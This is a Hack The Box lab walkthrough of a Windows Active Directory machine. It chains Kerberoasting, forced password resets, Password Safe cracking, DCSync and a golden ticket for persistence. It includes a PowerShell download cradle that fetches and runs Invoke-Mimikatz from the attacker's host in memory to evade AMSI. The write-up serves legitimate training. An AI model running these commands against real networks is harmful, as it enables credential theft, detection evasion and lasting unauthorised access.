+++
tags = ["Box", "HTB", "Medium", "Windows", "Active Directory", "Kerberos", "Kerberoasting", "DACLS", "ACL", "pwsafe"]
draft = true
title = "Administrator HTB Walkthrough"
author = "bloodstiller"
date = 2024-10-10
+++

## Administrator Hack The Box Walkthrough/Writeup: {#administrator-hack-the-box-walkthrough-writeup}

-   <https://app.hackthebox.com/machines/Administrator>


## How I use variables &amp; Wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
            -   `$machine` = the machine name e.g. `DC01`
        -   Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.

-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)


## 1. Enumeration: {#1-dot-enumeration}


### Assumed Breach Box: {#assumed-breach-box}

-   This box scenario assumes that the Active Directory (AD) environment has already been breached and that we have access to valid credentials.
-   This approach reflects a more realistic model, given that direct breaches of AD environments from external footholds are increasingly rare today.
-   +Note+:
    -   Even with assumed credentials, I’ll still conduct my standard enumeration process as if I don’t have them.
        -   This ensures I don’t overlook any findings just because access is available.
        -   Comprehensive documentation of all discoveries remains essential.


### NMAP: {#nmap}


#### Basic Scans: {#basic-scans}

-   **Basic TCP Scan**:
    -   `nmap $box -Pn -oA TCPbasicScan`
        ```shell
        kali in HTB/BlogEntriesMade/Administrator/scans/nmap  🍣 main  1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
        🕙 07:31:11 zsh ❯ nmap $box -Pn -oA TCPbasicScan
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-10 07:31 GMT
        Nmap scan report for 10.129.160.121
        Host is up (0.038s latency).
        Not shown: 988 closed tcp ports (reset)
        PORT     STATE SERVICE
        21/tcp   open  ftp
        53/tcp   open  domain
        88/tcp   open  kerberos-sec
        135/tcp  open  msrpc
        139/tcp  open  netbios-ssn
        389/tcp  open  ldap
        445/tcp  open  microsoft-ds
        464/tcp  open  kpasswd5
        593/tcp  open  http-rpc-epmap
        636/tcp  open  ldapssl
        3268/tcp open  globalcatLDAP
        3269/tcp open  globalcatLDAPssl

        Nmap done: 1 IP address (1 host up) scanned in 3.65 seconds

        ```
    -   **Initial thoughts**:
        -   FTP
        -   DNS
        -   SMB
        -   RPC
        -   LDAP
        -   Kerberos


#### Comprehensive Scans: {#comprehensive-scans}

-   **In depth scan TCP**:

    -   `sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP`

    <!--listend-->

    ```shell
    kali in HTB/BlogEntriesMade/Administrator/scans/nmap  🍣 main  1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
    🕙 07:32:32 zsh ✖  sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
    [sudo] password for kali:
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-10 07:33 GMT
    Nmap scan report for 10.129.160.121
    Host is up (0.037s latency).
    Not shown: 65509 closed tcp ports (reset)
    PORT      STATE SERVICE       VERSION
    21/tcp    open  ftp           Microsoft ftpd
    | ftp-syst:
    |_  SYST: Windows_NT
    53/tcp    open  domain        Simple DNS Plus
    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-10 14:34:09Z)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  tcpwrapped
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
    3269/tcp  open  tcpwrapped
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    9389/tcp  open  mc-nmf        .NET Message Framing
    47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    49664/tcp open  msrpc         Microsoft Windows RPC
    49665/tcp open  msrpc         Microsoft Windows RPC
    49666/tcp open  msrpc         Microsoft Windows RPC
    49667/tcp open  msrpc         Microsoft Windows RPC
    49668/tcp open  msrpc         Microsoft Windows RPC
    51257/tcp open  msrpc         Microsoft Windows RPC
    57547/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    57552/tcp open  msrpc         Microsoft Windows RPC
    57563/tcp open  msrpc         Microsoft Windows RPC
    57574/tcp open  msrpc         Microsoft Windows RPC
    57607/tcp open  msrpc         Microsoft Windows RPC
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.94SVN%E=4%D=11/10%OT=21%CT=1%CU=31464%PV=Y%DS=2%DC=I%G=Y%TM=673
    OS:0623B%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S
    OS:%TS=A)OPS(O1=M53CNW8ST11%O2=M53CNW8ST11%O3=M53CNW8NNT11%O4=M53CNW8ST11%O
    OS:5=M53CNW8ST11%O6=M53CST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6
    OS:=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M53CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O
    OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=
    OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%
    OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G
    OS:%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

    Network Distance: 2 hops
    Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    |_clock-skew: 7h00m01s
    | smb2-security-mode:
    |   3:1:1:
    |_    Message signing enabled and required
    | smb2-time:
    |   date: 2024-11-10T14:35:18
    |_  start_date: N/A

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

    ```


### LDAP `389`: {#ldap-389}


#### Using LDAP anonymous bind to enumerate further: {#using-ldap-anonymous-bind-to-enumerate-further}

-   If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
    -   We can actually retrieve a significant amount of information via anonymous bind such as:
        -   A list of all users
        -   A list of all groups
        -   A list of all computers.
        -   User account attributes.
        -   The domain password policy.
        -   Enumerate users who are susceptible to AS-REPRoasting.
        -   Passwords stored in the description fields
    -   The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.

-   I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here
    -   <https://github.com/bloodstiller/ldapire>
    -   <https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb>
        -   `python3 /home/kali/windowsTools/enumeration/ldapire.py $box`
        -   It will dump general information &amp; also detailed &amp; simple information including:
            -   Groups
            -   Users
-   It turns out the anonymous bind is not enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.
    1.  <span class="underline">We have the naming context of the domain</span>:
        ```shell
        🕙 07:33:20 zsh ❯ python3 /home/kali/windowsTools/enumeration/ldapire.py $box
        Attempting to connect to 10.129.160.121 with SSL...
        Failed to connect with SSL.
        Attempting to connect to 10.129.160.121 with non-SSL...
        Connected successfully using anonymous bind. Retrieving server information...
        DSA info (from DSE):
          Supported LDAP versions: 3, 2
          Naming contexts:
            DC=administrator,DC=htb
            CN=Configuration,DC=administrator,DC=htb
            CN=Schema,CN=Configuration,DC=administrator,DC=htb
            DC=DomainDnsZones,DC=administrator,DC=htb
            DC=ForestDnsZones,DC=administrator,DC=htb
        ```

    2.  <span class="underline">We have the domain functionality level</span>:
        ```shell
        Other:
          domainFunctionality:
            7
          forestFunctionality:
            7
          domainControllerFunctionality:
            7
          rootDomainNamingContext:
            DC=administrator,DC=htb
        ```

        -   The functionality level determines the minimum version of Windows server that can be used for a DC.
            -   +Note+: that any host os can be used on **workstations**, however the functionality level determines what the minimum version for DC's and the forest.
            -   <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels>
            -   Knowing the function level is useful as if want to target the DC's and servers, we can know by looking at the function level what the minimum level of OS would be.

            -   In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.
            -   Here’s a list of functional level numbers and their corresponding Windows Server operating systems:

                | Functional Level Number | Corresponding OS            |
                |-------------------------|-----------------------------|
                | 0                       | Windows 2000                |
                | 1                       | Windows Server 2003 Interim |
                | 2                       | Windows Server 2003         |
                | 3                       | Windows Server 2008         |
                | 4                       | Windows Server 2008 R2      |
                | 5                       | Windows Server 2012         |
                | 6                       | Windows Server 2012 R2      |
                | 7                       | Windows Server 2016         |
                | 8                       | Windows Server 2019         |
                | 9                       | Windows Server 2022         |

                -   +Note+:
                    -   Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.
                    -   As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.

        <!--listend-->

        2.  <span class="underline">We have the full server name</span>:
            -   Again we can see this has the CN as the base (mentioned previously.)
                ```shell
                serverName:
                    CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=administrator,DC=htb
                ```
    3.  It's pretty amazing already what we have learned just by running some fairly simple ldap queries.
        -   We have the naming context.
        -   Domain name.


#### Updating ETC/HOSTS &amp; Variables: {#updating-etc-hosts-and-variables}

-   **Updated Domain &amp; Machine Variables for Testing**:
    -   Now that I have this information, I can update the `domain` and `machine` variables used in tests:
        -   `update_var domain "administrator.htb"`
        -   `update_var machine "DC"`

-   **Updating `/etc/hosts` for DNS and LDAP Queries**:
    -   I update my `/etc/hosts` file to enable tools like [kerbrute](https://github.com/ropnop/kerbrute) for user enumeration and other tools that require DNS or LDAP for queries:
        -   `echo "$box   $domain $machine.$domain" | sudo tee -a /etc/hosts`


#### Syncing Clocks for Kerberos Exploitation: {#syncing-clocks-for-kerberos-exploitation}

-   Since Kerberos is enabled on this host, it's best practice to sync our clock with the host’s. This helps avoid issues from clock misalignment, which can cause false negatives in Kerberos exploitation attempts.
    -   `sudo ntpdate -s $domain`
    -   +Note+: I am doing this now as we have the DNS name etc.


### DNS `53`: {#dns-53}

-   **Using dnsenum to enumerate DNS entries**:
    -   `dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain`
    -   {{< figure src="/ox-hugo/2024-11-10-081759_.png" >}}
    -   Nothing of note.
    -   +Note+: The timestamps for this will be strange (if you look at those) due to having an issue with DNS for a while. It suddenly resolve.


### Kerberos `88`: {#kerberos-88}


#### Using netexec for Kerberoasting: {#using-netexec-for-kerberoasting}

-   **As we have creds we can kerberoast**:
    -   `netexec ldap $box -u $user -p $pass --kerberoast kerb.txt`
    -   {{< figure src="/ox-hugo/2024-11-10-075703_.png" >}}
    -   None


#### Using netexec for ASReproasting: {#using-netexec-for-asreproasting}

-   **We should always try and asreproast with a null/guest session as it can lead to an easy win**:
    -   `netexec ldap $box -u $user -p $pass --asreproast asrep.txt`
    -   {{< figure src="/ox-hugo/2024-11-10-075756_.png" >}}
    -   Nothing:


### RPC: {#rpc}

-   **As we have valid credentials we can also connect to RPC to enumerate further**:
    -   `rpcclient -U $user $box`
    -   {{< figure src="/ox-hugo/2024-11-10-074721_.png" >}}


#### Enumerating domain users via RPC: {#enumerating-domain-users-via-rpc}

-   **Enumerating users using rpc**:
    -   `enumdomusers`
    -   {{< figure src="/ox-hugo/2024-11-10-074752_.png" >}}
    -   I add all these users to my users list.
    -   **Querying inidividual users**:
        -   `queryuser [RID]`
        -   {{< figure src="/ox-hugo/2024-11-10-074919_.png" >}}
        -   I query each user in the event that there is anything useful in the description field but there isn't.


### FTP `21`: {#ftp-21}

-   **I connect to FTP and try &amp; authenticate as Olivia but she does not have access**:
    -   `ftp $box`
    -   {{< figure src="/ox-hugo/2024-11-10-080801_.png" >}}

-   **I also check as anonymous but no luck**:
    -   {{< figure src="/ox-hugo/2024-11-10-080920_.png" >}}


### SMB `445`: {#smb-445}


#### Attempting to connect with NULL &amp; Guest sessions: {#attempting-to-connect-with-null-and-guest-sessions}

-   **This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold**:
    -   `netexec smb $box -u 'guest' -p '' --shares`
    -   `netexec smb $box -u '' -p '' --shares`
    -   {{< figure src="/ox-hugo/2024-11-10-081001_.png" >}}
    -   Both NULL &amp; Guest sessions have been disabled.


#### Attempting to connect as Olivia: {#attempting-to-connect-as-olivia}

-   **I connect as Olivia and she has access to** `IPC$, NETLOGON & SYSVOL`, `SYSVOL` **can be interesting as sometimes it can contain shares**:
    -   `netexec smb $box -u $user -p $pass --shares`
    -   {{< figure src="/ox-hugo/2024-11-10-081426_.png" >}}


#### Using smbclient: {#using-smbclient}

-   **I connect to** `SYSVOL`:
    -   `smbclient -U 'guest' "\\\\$box\\SYSVOL"`
    -   {{< figure src="/ox-hugo/2024-11-10-081530_.png" >}}
    -   Nothing immediately jumps out lets table this.


## 2. Lateral Movement: {#2-dot-lateral-movement}


### Running a BloodHound Collection: {#running-a-bloodhound-collection}

-   **As we have credentials we can run bloodhound collection**
    -   `bloodhound-python -dc $machine.$domain -c All -u $user -p $pass -d $domain -ns $box`
    -   {{< figure src="/ox-hugo/2024-11-10-080541_.png" >}}


### Discovering an attack chain for lateral movement in bloodhound: {#discovering-an-attack-chain-for-lateral-movement-in-bloodhound}

-   **Looking at our bloodhound results we can see that Olivia has** `GenericAll` **rights over Michael which allows alot of potentially attack paths for us**:
    -   {{< figure src="/ox-hugo/2024-11-10-081920_.png" >}}
    -   We can perform a Targeted Kerberoasting Attack, Force Change their Password or a Shadow Credentials attack (these are just a few options.)
        -   We just need to look at the edge in bloodhound:
            -   {{< figure src="/ox-hugo/2024-11-10-092913_.png" >}}

-   **Michael in turn has the** `ForceChangePassword` **privilege over Benjamin**:
    -   {{< figure src="/ox-hugo/2024-11-10-082042_.png" >}}
    -   This means if we can control Michael we can then change Benjamin's password
    -   {{< figure src="/ox-hugo/2024-11-10-092959_.png" >}}

-   **Benjamin is a member of the Share Moderators group**:
    -   {{< figure src="/ox-hugo/2024-11-10-082232_.png" >}}
    -   So far I am unsure of what specifically this will grant us just yet but it seems like something interesting to go after.


### Performing a targeted kerberoasting attack on Michael: {#performing-a-targeted-kerberoasting-attack-on-michael}

-   I perform am going to perform a targeted kerberoast attack on michael from olivia's account. This way we can extract a hash for cracking.

-   **Clone the repo**:
    -   `git clone https://github.com/ShutdownRepo/targetedKerberoast.git`

-   **Perform our attack**:
    -   `python3 targetedKerberoast.py -v -d $domain -u $user -p $pass --request-user michael -o michael.kerb`
    -   {{< figure src="/ox-hugo/2024-11-10-103611_.png" >}}


### Attempting to crack Michael's password with hashcat: {#attempting-to-crack-michael-s-password-with-hashcat}

-   **Now we have Michael's kerberos ticket lets attempt to crack it with hashcat to export his clear text password**:
    -   `hashcat -m 13100 michael.kerb /home/kali/Wordlists/rockyou.txt -O`
    -   {{< figure src="/ox-hugo/2024-11-10-103700_.png" >}}
        -   It does not crack.


### Attempting to add Michael Directly to the Share Operators group: {#attempting-to-add-michael-directly-to-the-share-operators-group}

-   **As we have** `GenericAll` **over Michael we should be able to give him group access**: (this is incorrect see my notes)
    -   `net rpc group addmem "share moderators" "michael" -U $domain/$user%$pass -S $box`
    -   {{< figure src="/ox-hugo/2024-11-10-110119_.png" >}}
    -   +Note+: This is not possible as we do not have write privileges over the group. For some reason I was convinced at the time this was a viable approach.


### Changing Michaels Password: {#changing-michaels-password}

-   Our options at the start were to perform a targeted kerberoasting attack, which we performed but could not extract the hash. The other option is a shadow credentials attack however we cannot perform this as there is no CA &amp; so now we move onto changing Michaels password. Changing a user’s password is typically a last resort in an engagement, as it can disrupt the user's work and may fall outside the approved scope. This is why I left this until last

-   **Lets set the our new password**
    -   `newPass=bl00dst1ll3r!`
    -   `net rpc password "Michael" $newPass -U $domain/$user%$pass -S $box`
    -   {{< figure src="/ox-hugo/2024-11-10-110637_.png" >}}
    -   +Note+: There is no output from this so we need to verify it worked

-   **Verify it works**:
    -   `netexec smb $box -u $user -p $newPass --shares`
    -   {{< figure src="/ox-hugo/2024-11-10-110603_.png" >}}


### Enumerating as Michael: {#enumerating-as-michael}

-   **I check FTP access**:
    -   {{< figure src="/ox-hugo/2024-11-10-110850_.png" >}}
    -   Still no access.

-   **We can login via evil-winrm**:
    -   {{< figure src="/ox-hugo/2024-11-10-111106_.png" >}}
    -   I will come back to this as I want to proceed with the benjamin password change.
    -   +Note+: The user flag is not on the users desktop.

-   **I discover there are 3 users with access to the host**:
    -   {{< figure src="/ox-hugo/2024-11-10-114343_.png" >}}
    -   This is useful as if we extract more creds later this can help direct our attack.


### Changing Benjamins Password: {#changing-benjamins-password}

-   We repeat the process we did before for Michael but for Benjamin.

-   **Set our password**
    -   `net rpc password "Benjamin" $newPass -U $domain/$user%$newPass -S $box`
    -   {{< figure src="/ox-hugo/2024-11-10-111309_.png" >}}
    -   +Note+: There is no output from this so we need to verify it worked

-   **Verify it works**:
    -   `netexec smb $box -u benjamin -p $newPass --shares`
    -   {{< figure src="/ox-hugo/2024-11-10-111355_.png" >}}

-   **Benjamin does not have win-rm access**:
    -   {{< figure src="/ox-hugo/2024-11-10-111515_.png" >}}


### Accessing FTP as Benjamin: {#accessing-ftp-as-benjamin}

-   I check if benjamin has access to ftp &amp; he does

-   **Benjamin has access to FTP**:
    -   {{< figure src="/ox-hugo/2024-11-10-111557_.png" >}}


#### Finding a password safe file in the FTP: {#finding-a-password-safe-file-in-the-ftp}

-   **There is a file called** `Backup.psafe3`
    -   {{< figure src="/ox-hugo/2024-11-10-111636_.png" >}}

-   **I download the file to my local attach machine**:
    -   {{< figure src="/ox-hugo/2024-11-10-111945_.png" >}}
    -   There is an error as we are downloading in ascii mode, if we switch to binary mode we should be able to remove this warning.

-   **I switch to binary mode &amp; re-download to be sure**:
    -   {{< figure src="/ox-hugo/2024-11-10-112108_.png" >}}

-   **Looking online we discover the format** `psafe3` **is used by the password manager "Password Safe"**:
    -   <https://www.pwsafe.org/>


### Cracking the pwsafe File with John: {#cracking-the-pwsafe-file-with-john}

-   **John the ripper has a module for pwsafe files** `pwsafe2john` **I run this to extract the hash**:
    -   `pwsafe2john Backup.psafe3 > pwsafehash`

-   **Crack with john**:
    -   `john pwsafehash --wordlist=/home/kali/Wordlists/rockyou.txt`
    -   {{< figure src="/ox-hugo/2024-11-10-113007_.png" >}}


### Retrieving passwords from the pswafe file: {#retrieving-passwords-from-the-pswafe-file}

-   **So we can open this we need to install password safe**:
    ```shell
    # get release
    wget https://github.com/pwsafe/pwsafe/releases/download/1.20.0/passwordsafe-debian12-1.20-amd64.deb
    # make exectuable
    chmod +x passwordsafe-debian12-1.20-amd64.deb
    #install
    sudo apt install ~/Downloads/passwordsafe-debian12-1.20-amd64.deb
    ```

-   **Load up the file** `Backup.psafe3`:
    -   {{< figure src="/ox-hugo/2024-11-10-113740_.png" >}}
    -   I entered the cracked password too.

-   **When it opens we see the following entries**:
    -   {{< figure src="/ox-hugo/2024-11-10-113843_.png" >}}

-   **I click "Edit Entry" on each entry to expand it and see notes**:
    -   {{< figure src="/ox-hugo/2024-11-10-114037_.png" >}}
    -   I do this as sometimes additional information will be stored here which can be useful but there is nothing in this case.

-   **I retrieve all 3 users passwords**:
    -   Alexander, Emily &amp; Emma. I am especially interested in Emily as she is another user on the host.


## 3. Privilege Escalation: {#3-dot-privilege-escalation}


### Accessing the host as emily: {#accessing-the-host-as-emily}

-   **As we saw earlier that emily has access to the host connect using her credentials**:
    -   `evil-winrm -i $box -u $user -p $pass`
    -   {{< figure src="/ox-hugo/2024-11-10-114704_.png" >}}

-   **Grab the user flag**:
    -   {{< figure src="/ox-hugo/2024-11-10-114734_.png" >}}


### Discovering Emily has GenericWrite privileges over Ethan in bloodhound: {#discovering-emily-has-genericwrite-privileges-over-ethan-in-bloodhound}

-   **Emily has** `GenericWrite` **over Ethan**:
    -   Looking in bloodhound we can see emily has `GenericWrite` over Ethan
    -   {{< figure src="/ox-hugo/2024-11-10-114823_.png" >}}

-   **Ethan has** `DC-Sync` **Rights over the root domain object**:
    -   {{< figure src="/ox-hugo/2024-11-10-115026_.png" >}}
    -   This means if we can control ethan we can then perform a DC-Sync attack and extract all creds.


### Performing a targeted kerberoasting attack on Ethan: {#performing-a-targeted-kerberoasting-attack-on-ethan}

-   Looking at the `GenericWrite` edge in bloodhound we can see that a targeted kerberoasting attack is a viable option:
    -   {{< figure src="/ox-hugo/2024-11-10-145059_.png" >}}

-   **Perform our attack**:
    -   As we already have targetedKerberoast downloaded from earlier we can use that.
    -   `python3 targetedKerberoast.py -v -d $domain -u $user -p $pass --request-user ethan -o ethan.kerb`
    -   {{< figure src="/ox-hugo/2024-11-10-115305_.png" >}}
    -   We succesfully perform the attack


### Cracking the Ethan's Kerberos hash with hashcat: {#cracking-the-ethan-s-kerberos-hash-with-hashcat}

-   **Cracking ethans kerberos has with hashcat**:
    -   `hashcat -m 13100 ethan.kerb /home/kali/Wordlists/rockyou.txt -O`
        -   {{< figure src="/ox-hugo/2024-11-10-115411_.png" >}}
        -   It cracks

-   **We Verify his creds work**:
    -   `netexec smb $box -u $user -p $pass --shares`
    -   {{< figure src="/ox-hugo/2024-11-10-115519_.png" >}}


### Performing a DCSync Attack with impacket-secretsdump: {#performing-a-dcsync-attack-with-impacket-secretsdump}

-   As ethan has DC-Sync privileges we can perform a DC-Sync attack now.

-   **Performing the DC-Sync attack as Ethan**:
    -   `impacket-secretsdump $domain/$user:$pass@$box`
    -   {{< figure src="/ox-hugo/2024-11-10-115814_.png" >}}

-   **Getting our root flag via evil-winrm and PTH**:
    -   {{< figure src="/ox-hugo/2024-11-10-125113_.png" >}}


## 4. Persistence: {#4-dot-persistence}


### Trying to create a Kerberos Golden Ticket: {#trying-to-create-a-kerberos-golden-ticket}

-   **Using** `impacket-lookupsid` **to get the Search for the Domain SID**:
    -   `impacket-lookupsid $domain/$user@$machine.$domain -domain-sids`
    -   {{< figure src="/ox-hugo/2024-11-10-125258_.png" >}}

-   **Sync our clock to the host using ntupdate**:
    -   `sudo ntpdate -s $domain`

-   **Using** `impacket-ticketer` **to create the Golden Ticket**:
    -   `impacket-ticketer -nthash $krbtgt -domain-sid $sid -domain $domain Administrator`

-   **Export the ticket to the** `KRB5CCNAME` **Variable**:
    -   `export KRB5CCNAME=./administrator.ccache`

-   **Use the ticket for connecting via** `psexec`
    -   `impacket-psexec -k -no-pass $machine.$domain`
    -   {{< figure src="/ox-hugo/2024-11-10-140710_.png" >}}
    -   +Note+:
        -   This error occurs because protections are in place that prevent ticket creation using NT hashes or RC4 encryption.
        -   Instead, we need to create a Golden Ticket using the AES hash of the KRBTGT account.


### Using a download Cradle to load invoke-mimikatz into memory: {#using-a-download-cradle-to-load-invoke-mimikatz-into-memory}

-   Initially I tried to generate a ticket just using the KRBTGT NT hash however this was revoked (expected) however we can get around this by extracting the AESKEY using mimikatz and extracting a creating a ticket
-   To avoid AMSI I decide to use [invoke-mimikatz](https://github.com/g4uss47/Invoke-Mimikatz) this means I can use a download cradle to load the script directly into memory without needing to download anything onto the host itself.

-   **I stand up my python server**:
    -   `python3 -m http.server 9000`
    -   {{< figure src="/ox-hugo/2024-11-10-134523_.png" >}}
    -   +Note+: I have the above command aliased to `pws` for ease on my machine.

<!--listend-->

-   **On the target from an evil-winrm admin shell I use a download cradle to load the sript into memory**:
    -   `iex(new-object net.webclient).downloadstring('http://10.10.14.24:9000/Invoke-Mimikatz.ps1')`
    -   {{< figure src="/ox-hugo/2024-11-10-134628_.png" >}}
    -   +Note+: This will hang for a little bit, so just be patient.


### Using invoke-mimikatz to perform a targeted DC-Sync attack to extract the KRBTGT AES hash: {#using-invoke-mimikatz-to-perform-a-targeted-dc-sync-attack-to-extract-the-krbtgt-aes-hash}

-   **Lets perform a DC-SYNC attack targeting the krbtgt user and extract their aes hash**:
    -   `Invoke-Mimikatz -Command '"privilege::debug" "lsadump::dcsync /user:krbtgt /domain:administrator.htb"'`
    -   {{< figure src="/ox-hugo/2024-11-10-135022_.png" >}}
    -   +Note+: We already have the this AES hash from `secretsdump` but I wanted to demo how it can extracted using invoke-mimikatz/mimikatz &amp; a download cradle.


### Creating our golden-ticket using impacket-ticketer: {#creating-our-golden-ticket-using-impacket-ticketer}

-   **We can now create our ticket**:
    -   `impacket-ticketer -aesKey $aesKey -domain-sid $sid -domain $domain administrator`
    -   {{< figure src="/ox-hugo/2024-11-10-135257_.png" >}}

-   **Load into memory**:
    -   `export KRB5CCNAME=./administrator.ccache`


### Connecting via PSEXEC with our golden-ticket: {#connecting-via-psexec-with-our-golden-ticket}

-   **Access the host**:
    -   `impacket-psexec -k -no-pass $machine.$domain`
    -   {{< figure src="/ox-hugo/2024-11-10-140540_.png" >}}


#### Why create a golden ticket? {#why-create-a-golden-ticket}

-   "But bloodstiller why are you making a golden ticket if you have the admin hash?" Glad you asked:
    -   Creating a Golden Ticket during an engagement is a reliable way to maintain access over the long haul. Here’s why:
    -   `KRBTGT` **Hash Dependence**:
        -   Golden Tickets are generated using the `KRBTGT` account hash from the target’s domain controller.
        -   Unlike user account passwords, `KRBTGT` hashes are rarely rotated (and in many organizations, they are never changed), so the Golden Ticket remains valid indefinitely.
    -   `KRBTGT` **Hash—The Key to It All (for upto 10 years)**:
        -   A Golden Ticket can allow you to maintain access to a system for up to 10 years (yeah, you read that right the default lifespan of a golden ticket is 10 years) without needing additional credentials.
        -   This makes it a reliable backdoor, especially if re-access is needed long after initial entry.
        -   **Think about it**: even if they reset every user’s password (including the administrator etc) your Golden Ticket is still valid because it’s tied to the `KRBTGT` account, not individual users.


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1.  I learned that no matter how much I try and convince myself it's true unless I have write properties on an object I do not.
2.  I learned about cracking password safe files, I have never done that before so it was good to do.


### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1.  See note 1 above.
2.  Standard, reset box and didn't update my `/etc/hosts` and was like "wow that is strange behaviour it must be intended, until I realised I was just stupid"


## Sign off: {#sign-off}

Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

&#x2013; Bloodstiller

&#x2013; Get in touch bloodstiller at proton dot me


